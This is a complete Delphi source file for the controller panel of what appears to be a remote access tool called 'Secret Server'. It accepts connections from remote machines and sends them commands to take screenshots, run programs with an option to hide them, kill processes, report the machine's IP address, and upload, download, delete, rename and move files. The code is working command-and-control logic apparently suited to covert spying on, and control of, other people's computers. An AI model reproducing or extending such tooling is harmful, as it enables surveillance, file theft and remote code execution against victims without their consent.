unit SecretServer;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ScktComp, ComCtrls, idglobal, ExtCtrls, ShellAPI, WinSock,
  MMSystem, JPEG, Buttons, Menus, uKBDynamic, WinXP, Functions, DateUtils,
  TNTClasses, TNTClipBrd, TNTDialogs, TNTStdCtrls, TNTSysUtils, TNTGraphics;

type
  TForm1 = class(TForm)
    ServerSocket1: TServerSocket;
    Memo1: TTNTMemo;
    BitBtn1: TBitBtn;
    Edit1: TTNTEdit;
    Edit2: TTNTEdit;
    Edit3: TTNTEdit;
    Edit4: TTNTEdit;
    Edit5: TTNTEdit;
    Edit6: TTNTEdit;
    Label1: TTNTLabel;
    Label2: TTNTLabel;
    ListBox1: TTNTListBox;
    ListBox2: TTNTListBox;
    ListBox3: TTNTListBox;
    Button1: TButton;
    Button2: TButton;
    Button4: TButton;
    Button3: TButton;
    Button5: TButton;
    ComboBox1: TComboBox;
    ComboBox2: TComboBox; 
    OpenDialog1: TTNTOpenDialog;
    SaveDialog1: TTNTSaveDialog;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    TabSheet4: TTabSheet;
    Terminate1: TMenuItem;
    Update1: TMenuItem;
    Update2: TMenuItem;
    Rename1: TMenuItem;
    Upload1: TMenuItem;
    Download1: TMenuItem;
    Delete1: TMenuItem;
    Open1: TMenuItem;
    CreateFolder1: TMenuItem;
    Cut1: TMenuItem;
    Copy1: TMenuItem;
    Copy2: TMenuItem;
    Paste1: TMenuItem;
    Moving1: TMenuItem;
    Close1: TMenuItem;
    GetFolderSize1: TMenuItem;
    CopyName1: TMenuItem;
    PopupMenu1: TPopupMenu;
    PopupMenu2: TPopupMenu;
    PopupMenu3: TPopupMenu;
    PopupMenu4: TPopupMenu;
    Label4: TTNTLabel;
    Label3: TTNTLabel;
    Label6: TTNTLabel;
    Label7: TTNTLabel;
    Label8: TTNTLabel;
    CheckBox1: TCheckBox;
    UpDown1: TUpDown;
    procedure Button1Click(Sender: TObject);
    procedure ServerSocket1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Button2Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure ListBox1Click(Sender: TObject);
    procedure BitBtn1Click(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure Terminate1Click(Sender: TObject);
    procedure ServerSocket2ClientError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure ServerSocket1ClientError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure Update1Click(Sender: TObject);
    procedure ComboBox1KeyPress(Sender: TObject; var Key: Char);
    procedure Update2Click(Sender: TObject);
    procedure ComboBox1Change(Sender: TObject);
    procedure CreateFolder1Click(Sender: TObject);
    procedure Open1Click(Sender: TObject);
    procedure Rename1Click(Sender: TObject);
    procedure Delete1Click(Sender: TObject);
    procedure Upload1Click(Sender: TObject);
    procedure Download1Click(Sender: TObject);
    procedure ListBox3DblClick(Sender: TObject);
    procedure ListBox3DrawItem(Control: TWinControl; Index: Integer; Rect: TRect; State: TOwnerDrawState);
    procedure ListBox2DrawItem(Control: TWinControl; Index: Integer; Rect: TRect; State: TOwnerDrawState);
    procedure ListBox3Click(Sender: TObject);
    procedure ListBox3KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure ListBox2KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure Close1Click(Sender: TObject);
    procedure Cut1Click(Sender: TObject);
    procedure Copy1Click(Sender: TObject);
    procedure Paste1Click(Sender: TObject);
    procedure GetFolderSize1Click(Sender: TObject);
    procedure CopyName1Click(Sender: TObject);
    procedure CopyName2Click(Sender: TObject);
    procedure ComboBox2KeyPress(Sender: TObject; var Key: Char);
    procedure ComboBox3KeyPress(Sender: TObject; var Key: Char);
    procedure Edit4KeyPress(Sender: TObject; var Key: Char);
    procedure Edit4Exit(Sender: TObject);
    procedure Copy2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Memo1Change(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

type
  TServerSocketAccess = class(TServerSocket)
  end;

type
  TItem = record
    FileName: WideString;
    FileSize: Int64;
    FileType: DWORD;
  end;

  TItemList = array of TItem;

  TItemDB = record
    CurrentDir: WideString;
    ItemTable: TItemList
  end;

const
  TIMEOUT_INTERVAL = 1500;

var
  Form1: TForm1;
  ItemDB: TItemDB;
  OperationSize: Int64;
  OperationComplete: Boolean;
  Operation: WideString;
  FileStream: TTNTFileStream;
  PasteFileName, PasteType: WideString;
  SocketStream: TMemoryStream;

implementation

{$R *.dfm}


//RemoveUser
procedure RemoveUser(Name: String);
var
  i: Integer;
begin
  for i := 0 to Form1.ListBox1.Items.Count-1 do begin
    if Form1.ListBox1.Items.Strings[i] = Name then begin
      Form1.ListBox1.Items.Delete(i);
      Break;
    end;
  end;
end;
//RemoveUser


//BuildList
procedure BuildList(var A: TItemList);
var
  FolderColor: DWORD;
  i: Integer;
begin
  Form1.ListBox3.Clear;
  FolderColor := RGB(188, 188, 88);
  for i := 0 to Length(A)-1 do begin
    if A[i].FileType = faDirectory
      then Form1.ListBox3.Items.AddObject(A[i].FileName, Pointer(FolderColor))
      else Form1.ListBox3.Items.AddObject(A[i].FileName, Pointer(clBlack));
  end;
end;
//BuildList


//GetSocket
function GetSocket(Index: Integer): TCustomWinSocket;
begin
  Result := Form1.ServerSocket1.Socket.Connections[Index];
end;
//GetSocket


//GetUserIndex
function GetUserIndex(SocketHandle: Integer): Integer;
var
  i: Integer;
begin
  Result := -1;

  for i := 0 to Form1.ServerSocket1.Socket.ActiveConnections-1 do begin
    if Form1.ServerSocket1.Socket.Connections[i].SocketHandle = SocketHandle then begin
      Result := i;
      Break;
    end;
  end;
end;
//GetUserIndex


//SendCommand
procedure SendCommand(Socket: TCustomWinSocket; SocketCommands: array of WideString; WaitFor: Boolean);
var
  MemoryStream: TMemoryStream;
  StringList: TTNTStringList;
  SavedTime: TDateTime;
  i: Integer;
begin
  StringList := TTNTStringList.Create;
  StringList.Add(BoolToStr(WaitFor, True));

  for i := 0 to Length(SocketCommands)-1 do begin
    StringList.Add(SocketCommands[i]);
  end;

  StringList.Delimiter := '|';
  Form1.Memo1.Lines.Add('Sending to ' + Form1.ListBox1.Items[GetUserIndex(Socket.SocketHandle)] + ' -> ' + StringList.DelimitedText);

  MemoryStream := TMemoryStream.Create;
  StringList.SaveToStream(MemoryStream);
  StringList.Free;
  MemoryStream.Position := 0;

  SavedTime := Now;
  OperationComplete := not WaitFor;
  Socket.SendStream(MemoryStream);

  while not OperationComplete do begin
    if MillisecondsBetween(SavedTime, Now) > TIMEOUT_INTERVAL then Break;
    Wait(50);
  end;
end;
//SendCommand


//SendStream
procedure SendStream(Socket: TCustomWinSocket; Stream: TStream; WaitFor: Boolean);
var
  SavedTime: TDateTime;
begin
  SavedTime := Now;
  OperationComplete := not WaitFor;
  Socket.SendStream(Stream);

  while not OperationComplete do begin
    if MillisecondsBetween(SavedTime, Now) > TIMEOUT_INTERVAL then Break;
    Wait(50);
  end;
end;
//SendStream


procedure TForm1.FormShow(Sender: TObject);
begin
  ListBox2.Style := lbOwnerDrawFixed;
  ListBox3.Style := lbOwnerDrawFixed;
  Edit1.Text := GetIPV4;
  Button1.SetFocus;
end;


procedure TForm1.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
var
  PhotoViewer: HWND;
begin
  DeleteFile(GetEnvironmentVariable('TEMP') + '\screenshot.jpg');
  PhotoViewer := FindWindowExtd('screenshot.jpg');
  SendMessage(PhotoViewer, WM_CLOSE, 0, 0);
end;


procedure TForm1.Button1Click(Sender: TObject);
begin
  if Button1.Caption = 'Start Server' then begin
    ServerSocket1.Port := StrToInt(Edit2.Text);
    TServerSocketAccess(ServerSocket1).Address := Edit1.Text;
    ServerSocket1.Open;

    Edit1.Enabled := False;
    Edit2.Enabled := False;
    Button1.Enabled := False;

    Operation := '';
    PasteFileName := '';

    Wait(500);
    Button1.Caption := 'Stop Server';
    Button1.Enabled := True;
  end else begin
    ServerSocket1.Close;
    ListBox1.Clear;

    Edit1.Enabled := True;
    Edit2.Enabled := True;
    Button1.Enabled := False;
    Wait(500);
    Button1.Caption := 'Start Server';
    Button1.Enabled := True;
  end;
end;


procedure TForm1.ListBox1Click(Sender: TObject);
begin
  ListBox1.Hint := ListBox1.Items[ListBox1.ItemIndex];
end;


procedure TForm1.ListBox3DrawItem(Control: TWinControl; Index: Integer; Rect: TRect; State: TOwnerDrawState);
begin
  with Control as TTNTListBox do begin
    Canvas.FillRect(Rect);
    Canvas.Font.Color := TColor(Items.Objects[Index]);
    WideCanvasTextOut(Canvas, Rect.Left + 2, Rect.Top, Items[Index]);
  end;
end;


procedure TForm1.ListBox2DrawItem(Control: TWinControl; Index: Integer; Rect: TRect; State: TOwnerDrawState);
begin
  with Control as TTNTListBox do begin
    Canvas.FillRect(Rect);
    Canvas.Font.Color := TColor(Items.Objects[Index]);
    WideCanvasTextOut(Canvas, Rect.Left + 2, Rect.Top, Items[Index]);
  end;
end;


procedure TForm1.ServerSocket1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
  Buffer: array [0..9999] of Char;
  IncommingLen, RecievedLen: Integer;
  SocketCommands: TTNTStringList;
  PohotoViewer: HWND;
begin
  //Recive file
  if (Operation = 'Download') then begin
    IncommingLen := Socket.ReceiveLength;

    while IncommingLen > 0 do begin
      RecievedLen := Socket.ReceiveBuf(Buffer, SizeOf(Buffer));
      if RecievedLen <= 0 then Break else FileStream.Write(Buffer, RecievedLen);

      Memo1.Lines.Add('Reciving file ' + IntToStr(FileStream.Size) + ' of ' + IntToStr(OperationSize) + ' bytes');
      Label7.Caption := Format('%.2f', [(FileStream.Size/OperationSize)*100]) + '%';

      if FileStream.Size >= OperationSize then begin
        Operation := '';
        FileStream.Free;
        Label7.Caption := '100%';
        Break;
      end;
    end;

    Exit;
  end;


  //Recive items
  if (Operation = 'Items') then begin
    IncommingLen := Socket.ReceiveLength;

    while IncommingLen > 0 do begin
      RecievedLen := Socket.ReceiveBuf(Buffer, SizeOf(Buffer));
      if RecievedLen <= 0 then Break else SocketStream.Write(Buffer, RecievedLen);
      Memo1.Lines.Add('Reciving data ' + IntToStr(SocketStream.Size) + ' of ' + IntToStr(OperationSize) + ' bytes');

      if SocketStream.Size >= OperationSize then begin
        Operation := '';
        SocketStream.Position := 0;
        TKBDynamic.ReadFrom(SocketStream, ItemDB, TypeInfo(TItemDB), 1);
        Label6.Caption := ItemDB.CurrentDir;
        BuildList(ItemDB.ItemTable);
        SocketStream.Free;
        Break;
      end;
    end;

    Exit;
  end;


  //Recive processes
  if (Operation = 'Processes') then begin
    IncommingLen := Socket.ReceiveLength;

    while IncommingLen > 0 do begin
      RecievedLen := Socket.ReceiveBuf(Buffer, SizeOf(Buffer));
      if RecievedLen <= 0 then Break else SocketStream.Write(Buffer, RecievedLen);
      Memo1.Lines.Add('Reciving data ' + IntToStr(SocketStream.Size) + ' of ' + IntToStr(OperationSize) + ' bytes');

      if SocketStream.Size >= OperationSize then begin
        Operation := '';
        SocketStream.Position := 0;
        ListBox2.Items.LoadFromStream(SocketStream);
        SocketStream.Free;
        Break;
      end;
    end;

    Exit;
  end;


  //Recive screenshot
  if (Operation = 'Screenshot') then begin
    IncommingLen := Socket.ReceiveLength;

    while IncommingLen > 0 do begin
      RecievedLen := Socket.ReceiveBuf(Buffer, SizeOf(Buffer));
      if RecievedLen <= 0 then Break else SocketStream.Write(Buffer, RecievedLen);
      Memo1.Lines.Add('Reciving data ' + IntToStr(SocketStream.Size) + ' of ' + IntToStr(OperationSize) + ' bytes');

      if SocketStream.Size >= OperationSize then begin
        Operation := '';
        SocketStream.SaveToFile(GetEnvironmentVariable('TEMP') + '\screenshot.jpg');
        SocketStream.Free;
        PohotoViewer := FindWindowExtd('screenshot.jpg');
        ShellExecute(Handle, 'open', PChar(GetEnvironmentVariable('TEMP') + '\screenshot.jpg'), nil, nil, SW_SHOWNORMAL);
        Wait(100);
        SendMessage(PohotoViewer, WM_CLOSE, 0, 0);
        if CheckBox1.Checked then BitBtn1.Click;
        Break;
      end;
    end;

    Exit;
  end;


  //Recive command
  IncommingLen := Socket.ReceiveLength;
  if IncommingLen <= 0 then Exit;
  SocketStream := TMemoryStream.Create;

  while IncommingLen > 0 do begin
    RecievedLen := Socket.ReceiveBuf(Buffer, SizeOf(Buffer));
    if RecievedLen <= 0 then Break else SocketStream.Write(Buffer, RecievedLen);
  end;

  //Read stream
  SocketStream.Position := 0;
  SocketCommands := TTNTStringList.Create;
  SocketCommands.LoadFromStream(SocketStream);
  SocketStream.Free;

  //Show command in logs
  SocketCommands.Delimiter := '|';
  Memo1.Lines.Add(SocketCommands.DelimitedText);

  //Check for commands
  if SocketCommands[1] = 'DONE' then begin
    OperationComplete := True;
  end;

  if SocketCommands[1] = 'CLOSE' then begin
    RemoveUser(SocketCommands[2]);
  end;

  if SocketCommands[1] = 'LOGIN' then begin
    ListBox1.Items.Add(SocketCommands[2]);
    if (ListBox1.ItemIndex < 0) and (ListBox1.Items.Count > 0) then ListBox1.ItemIndex := 0;
  end;

  if SocketCommands[1] = 'IPADDRESS' then begin
    Label4.Caption := 'IP Address: ' + SocketCommands[2];
  end;

  if SocketCommands[1] = 'FOLDERSIZE' then begin
    Label3.Caption := 'Size: ' + FormatSize(StrToInt64(SocketCommands[2]), 2);
  end;

  if SocketCommands[1] = 'PERCENT' then begin
    Label7.Caption := SocketCommands[2] + '%';
    Memo1.Lines.Delete(Memo1.Lines.Count-2);
  end;

  if SocketCommands[1] = 'OPERATION' then begin
    Operation := SocketCommands[2];
    if Operation = 'Items' then SocketStream := TMemoryStream.Create;
    if Operation = 'Processes' then SocketStream := TMemoryStream.Create;
    if Operation = 'Screenshot' then SocketStream := TMemoryStream.Create;
    OperationSize := StrToInt64(SocketCommands[3]);
  end;

  if SocketCommands[0] = 'True' then SendCommand(GetSocket(ListBox1.ItemIndex), ['DONE'], False);
end;


procedure TForm1.Close1Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  SendCommand(GetSocket(ListBox1.ItemIndex), ['CLOSE'], False);
end;


procedure TForm1.Button2Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  SendCommand(GetSocket(ListBox1.ItemIndex), ['MESSAGE', Edit3.Text], False);
end;


procedure TForm1.Button4Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  SendCommand(GetSocket(ListBox1.ItemIndex), ['TERMINATE', Edit5.Text], False);
end;


procedure TForm1.Button5Click(Sender: TObject);
var
  StartupShow: String;
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  if Edit6.Text = '' then Exit;
  if ComboBox2.Items[ComboBox2.ItemIndex] = 'SW_HIDE' then StartupShow := IntToStr(SW_HIDE);
  if ComboBox2.Items[ComboBox2.ItemIndex] = 'SW_SHOW' then StartupShow := IntToStr(SW_SHOW);
  if ComboBox2.Items[ComboBox2.ItemIndex] = 'SW_SHOWNORMAL' then StartupShow := IntToStr(SW_SHOWNORMAL);
  if ComboBox2.Items[ComboBox2.ItemIndex] = 'SW_SHOWMAXIMIZED' then StartupShow := IntToStr(SW_SHOWMAXIMIZED);
  SendCommand(GetSocket(ListBox1.ItemIndex), ['EXECUTE', Edit6.Text, StartupShow], False);
end;


procedure TForm1.BitBtn1Click(Sender: TObject);
begin
  if ListBox1.ItemIndex < -1 then Exit;
  if Length(Edit4.Text) <= 0 then Edit4.Text := '1';
  if Length(Edit4.Text) <= 0 then Exit;
  if StrToInt(Edit4.Text) < 1 then Edit4.Text := '1';
  if StrToInt(Edit4.Text) > 100 then Edit4.Text := '100';
  SendCommand(GetSocket(ListBox1.ItemIndex), ['SCREENSHOT', Edit4.Text], False);
end;


procedure TForm1.Update1Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  SendCommand(GetSocket(ListBox1.ItemIndex), ['PROCESSES'], False);
end;


procedure TForm1.Terminate1Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  if ListBox2.ItemIndex <= -1 then Exit;
  SendCommand(GetSocket(ListBox1.ItemIndex), ['TERMINATE', ListBox2.Items[ListBox2.ItemIndex]], False);
end;


procedure TForm1.ComboBox1Change(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  SendCommand(GetSocket(ListBox1.ItemIndex), ['OPENITEM', ComboBox1.Items[ComboBox1.ItemIndex]], False);
end;


procedure TForm1.Update2Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;

  if ListBox3.Items.Count = 0 then begin
    SendCommand(GetSocket(ListBox1.ItemIndex), ['OPENITEM', ComboBox1.Items[ComboBox1.ItemIndex]], False);
    Exit;
  end;

  SendCommand(GetSocket(ListBox1.ItemIndex), ['UPDATEFOLDER'], False);
end;


procedure TForm1.CreateFolder1Click(Sender: TObject);
var
  FolderName: WideString;
  OkPressed: Boolean;
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  FolderName := 'New folder';
  OkPressed := WideInputQuery('Secret Server', 'Enter new folder name', FolderName, Form1.Font);
  if OkPressed and (FolderName <> '') then SendCommand(GetSocket(ListBox1.ItemIndex), ['CREATEFOLDER', FolderName], False);
end;


procedure TForm1.Open1Click(Sender: TObject);
var
  Temporaly: WideString;
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  if ListBox3.ItemIndex <= -1 then Exit;

  Temporaly := Edit6.Text;
  Edit6.Text := ItemDB.CurrentDir + '\' + ListBox3.Items[ListBox3.ItemIndex];
  Button5.Click;
  Edit6.Text := Temporaly;
end;


procedure TForm1.Rename1Click(Sender: TObject);
var
  OldFileName, NewFileName: WideString;
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  if ListBox3.ItemIndex <= -1 then Exit;
  if ListBox3.Items[ListBox3.ItemIndex] = '..' then Exit;

  OldFileName := ItemDB.CurrentDir + '\' + ListBox3.Items[ListBox3.ItemIndex];
  NewFileName := ItemDB.CurrentDir + '\' + WideInputBox('Secret Server', 'Enter new file name', ListBox3.Items[ListBox3.ItemIndex], Form1.Font);
  SendCommand(GetSocket(ListBox1.ItemIndex), ['RENAME', OldFileName, NewFileName], False);
end;


procedure TForm1.Delete1Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  if ListBox3.ItemIndex <= -1 then Exit;
  SendCommand(GetSocket(ListBox1.ItemIndex), ['DELETE', ListBox3.Items[ListBox3.ItemIndex]], False);
end;


procedure TForm1.Upload1Click(Sender: TObject);
var
  FileStream: TTNTFileStream;
  FileName: WideString;
begin
  if ListBox1.ItemIndex <= -1 then Exit;

  if OpenDialog1.Execute then begin
    FileStream := TTNTFileStream.Create(OpenDialog1.FileName, fmOpenRead);
    FileName := ItemDB.CurrentDir + '\' + WideExtractFileName(OpenDialog1.FileName);
    SendCommand(GetSocket(ListBox1.ItemIndex), ['UPLOAD', FileName, IntToStr(FileStream.Size)], True);
    SendStream(GetSocket(ListBox1.ItemIndex), FileStream, False);
  end;
end;


procedure TForm1.Download1Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  if ListBox3.ItemIndex <= -1 then Exit;
  if ItemDB.ItemTable[ListBox3.ItemIndex].FileType <> faAnyFile then Exit;

  SaveDialog1.InitialDir := WideGetCurrentDir;
  SaveDialog1.FileName := ListBox3.Items[ListBox3.ItemIndex];

  if SaveDialog1.Execute then begin
    FileStream := TTNTFileStream.Create(SaveDialog1.FileName, fmCreate or fmOpenWrite);
    SendCommand(GetSocket(ListBox1.ItemIndex), ['DOWNLOAD', ItemDB.CurrentDir + '\' + ListBox3.Items[ListBox3.ItemIndex]], False);
  end;
end;


procedure TForm1.ListBox3DblClick(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  if ListBox3.ItemIndex <= -1 then Exit;
  if ItemDB.ItemTable[ListBox3.ItemIndex].FileType <> faDirectory then Exit;
  SendCommand(GetSocket(ListBox1.ItemIndex), ['OPENITEM', ItemDB.CurrentDir + '\' + ListBox3.Items[ListBox3.ItemIndex]], False);
end;


procedure TForm1.ServerSocket1ClientError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  Memo1.Lines.Add('ServerSocket1 Error: ' + IntToStr(ErrorCode));
  Socket.Close;
  ErrorCode := 0;
end;


procedure TForm1.ServerSocket2ClientError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  Memo1.Lines.Add('ServerSocket2 Error: ' + IntToStr(ErrorCode));
  ErrorCode := 0;
end;


procedure TForm1.ComboBox1KeyPress(Sender: TObject; var Key: Char);
begin
  Key := #0;
end;


procedure TForm1.ComboBox2KeyPress(Sender: TObject; var Key: Char);
begin
  Key := #0;
end;


procedure TForm1.ComboBox3KeyPress(Sender: TObject; var Key: Char);
begin
  Key := #0;
end;


procedure TForm1.ListBox3Click(Sender: TObject);
begin
  if ListBox3.ItemIndex <= -1 then Exit;

  if ItemDB.ItemTable[ListBox3.ItemIndex].FileType = 1
    then Label3.Caption := 'Size: '
    else Label3.Caption := 'Size: ' + FormatSize(ItemDB.ItemTable[ListBox3.ItemIndex].FileSize, 2);
end;


procedure TForm1.ListBox3KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
var
  i: Integer;
begin
  for i := ListBox3.ItemIndex+1 to Length(ItemDB.ItemTable)-1 do begin
    if Ord(ItemDB.ItemTable[i].FileName[1]) = Ord(Key) then begin
      ListBox3.ItemIndex := i;
      Exit;
    end;
  end;

  for i := 0 to ListBox3.ItemIndex-1 do begin
    if Ord(ItemDB.ItemTable[i].FileName[1]) = Ord(Key) then begin
      ListBox3.ItemIndex := i;
      Exit;
    end;
  end;
end;


procedure TForm1.ListBox2KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
var
  i: Integer;
begin
  for i := ListBox2.ItemIndex+1 to ListBox2.Items.Count-1 do begin
    if Ord(ListBox2.Items[i][1]) = Ord(Key) then begin
      ListBox2.ItemIndex := i;
      Exit;
    end;
  end;

  for i := 0 to ListBox2.ItemIndex-1 do begin
    if Ord(ListBox2.Items[i][1]) = Ord(Key) then begin
      ListBox2.ItemIndex := i;
      Exit;
    end;
  end;
end;


procedure TForm1.Cut1Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  if ListBox3.ItemIndex <= -1 then Exit;

  PasteFileName := ItemDB.CurrentDir + '\' + ListBox3.Items[ListBox3.ItemIndex];
  PasteType := 'CUT';
end;


procedure TForm1.Copy1Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  if ListBox3.ItemIndex <= -1 then Exit;

  PasteFileName := ItemDB.CurrentDir + '\' + ListBox3.Items[ListBox3.ItemIndex];
  PasteType := 'COPY';
end;


procedure TForm1.Paste1Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  SendCommand(GetSocket(ListBox1.ItemIndex), ['PASTE', PasteType, PasteFileName, ItemDB.CurrentDir], False);
end;


procedure TForm1.GetFolderSize1Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  if ListBox3.ItemIndex <= -1 then Exit;
  if ItemDB.ItemTable[ListBox3.ItemIndex].FileType <> faDirectory then Exit;
  SendCommand(GetSocket(ListBox1.ItemIndex), ['FOLDERSIZE', ItemDB.CurrentDir + '\' + ListBox3.Items[ListBox3.ItemIndex]], False);
end;


procedure TForm1.CopyName1Click(Sender: TObject);
var
  FolderName: WideString;
begin
  if ListBox3.ItemIndex <= -1 then Exit;

  FolderName := ItemDB.CurrentDir;
  if FolderName[Length(FolderName)] <> '\' then FolderName := FolderName + '\';
  TNTClipboard.AsText := FolderName + ListBox3.Items[ListBox3.ItemIndex];
end;


procedure TForm1.CopyName2Click(Sender: TObject);
begin
  if ListBox2.ItemIndex <= -1 then Exit;
  TNTClipboard.AsText := ListBox2.Items[ListBox2.ItemIndex];
end;


procedure TForm1.Edit4KeyPress(Sender: TObject; var Key: Char);
begin
  if not (Key in [#8, '0'..'9']) then Key := #0;
end;


procedure TForm1.Edit4Exit(Sender: TObject);
begin
  if Length(Edit4.Text) > 3 then Edit4.Text := '100';
  if Length(Edit4.Text) > 3 then Exit;
  if Length(Edit4.Text) <= 0 then Edit4.Text := '1';
  if Length(Edit4.Text) <= 0 then Exit;
  if StrToInt(Edit4.Text) < 1 then Edit4.Text := '1';
  if StrToInt(Edit4.Text) > 100 then Edit4.Text := '100';
end;


procedure TForm1.Button3Click(Sender: TObject);
begin
  if ListBox1.ItemIndex <= -1 then Exit;
  SendCommand(GetSocket(ListBox1.ItemIndex), ['IPADDRESS'], False);
end;


procedure TForm1.Copy2Click(Sender: TObject);
var
  IPAddress: String;
begin
  IPAddress := StringReplace(Label4.Caption, 'IP Address: ', '', [rfReplaceAll, rfIgnoreCase]);
  if IPAddress <> '' then TNTClipboard.AsText := IPAddress;
end;


procedure TForm1.Memo1Change(Sender: TObject);
begin
  SendMessage(Form1.Memo1.Handle, WM_VSCROLL, SB_BOTTOM, 0);
end;

end.
